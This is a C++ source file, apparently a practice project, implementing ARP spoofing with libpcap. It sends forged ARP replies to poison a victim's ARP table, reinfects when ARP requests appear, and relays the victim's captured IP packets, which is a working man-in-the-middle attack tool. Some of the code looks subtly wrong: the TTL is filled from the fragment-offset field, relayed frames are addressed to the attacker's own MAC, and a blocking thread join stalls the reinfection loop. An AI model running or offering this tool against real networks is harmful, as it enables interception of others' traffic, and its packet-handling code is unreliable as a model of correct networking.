#include "main.h"
#include <thread>

#pragma pack(push, 1)
struct IpPacket final
{
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

void relayIpPacket(pcap_t *handle, Ip send_ip, Mac att_mac)
{
	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *ip_packet;
		int result = pcap_next_ex(handle, &header, &ip_packet);
		if (result != 1)
		{
			continue;
		}
		IpPacket *ip = (IpPacket *)ip_packet;
		
		// printf("packet ip : %s\n", std::string(Ip(ntohl(ip->ip_.sip_))).data());
		// printf("send ip : %s\n", std::string(send_ip).c_str());
		if (ntohl((ip->ip_.sip_)) == send_ip && 
		ip->eth_.dmac_ == att_mac)
		{
			printf("[*] Ip packet captured..\n");
			printf("src ip : %s...\n", std::string(Ip(ntohl(ip->ip_.sip_))).data());
			printf("src mac : %s...\n", std::string(ip->eth_.smac_).data());
			printf("dst ip : %s...\n", std::string(Ip(ntohl(ip->ip_.dip_))).data());
			printf("dst mac : %s...\n", std::string(ip->eth_.dmac_).data());
			IpPacket packet;

			packet.eth_.dmac_ = att_mac;
			packet.eth_.smac_ = ip->eth_.dmac_;
			packet.eth_.type_ = htons(EthHdr::Ip4);

			packet.ip_.hl_ = ip->ip_.hl_;
			packet.ip_.v_ = ip->ip_.v_;

			packet.ip_.tos_ = ip->ip_.tos_;

			packet.ip_.len_ = ip->ip_.len_;
			packet.ip_.id_ = ip->ip_.id_;
			packet.ip_.off_ = ip->ip_.off_;

			packet.ip_.ttl_ = ip->ip_.off_;
			packet.ip_.p_ = ip->ip_.p_;
			packet.ip_.sum_ = ip->ip_.sum_;

			packet.ip_.sip_ = ip->ip_.sip_;
			packet.ip_.dip_ = ip->ip_.dip_;

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(IpPacket));
			if (res != 0)
			{
				fprintf(stderr, "[*] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			else
			{
				printf("\n\n------------------------------\n");
				printf("[*] Ip packet replay succeeded!");
				printf("\n------------------------------\n\n");
			}
		}
	}
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc - 1; iter += 2)
	{
		char *dev = argv[1];
		const char *interfaceName = argv[1];

		// Collect host info for ARP packet
		unsigned char att_mac[6];
		char att_ip[INET_ADDRSTRLEN];
		getHostInfo(argv[1], att_mac, att_ip);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// Send ARP Request packet for dst_mac(victim MAC address)
		char send_mac[ETH_ALEN];
		char *send_ip = argv[iter];
		char *tar_ip = argv[iter + 1];

		getSenderMac(handle, Mac(att_mac), Ip(att_ip), send_mac, Ip(send_ip));

		printf("sender MAC : %s\n", send_mac);
		printf("sender IP : %s\n", send_ip);

		// Send ARP Reply packet to infect victim(sender)'s ARP table
		sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));

		// Reinfection
		// Case #1 : sender broadcasts arp request packet (to get gateway's mac)
		// Case #2 : gateway broadcasts arp request packet (to get sender's mac)
		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
		while (true)
		{
			if (reinfect(handle, send_ip, tar_ip) == 1)
			{
				sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
			}
			// Relay packet
			std::thread t1(relayIpPacket, handle, Ip(send_ip), Mac(att_mac));
			
			t1.join();
		}

		pcap_close(handle);
	}
}
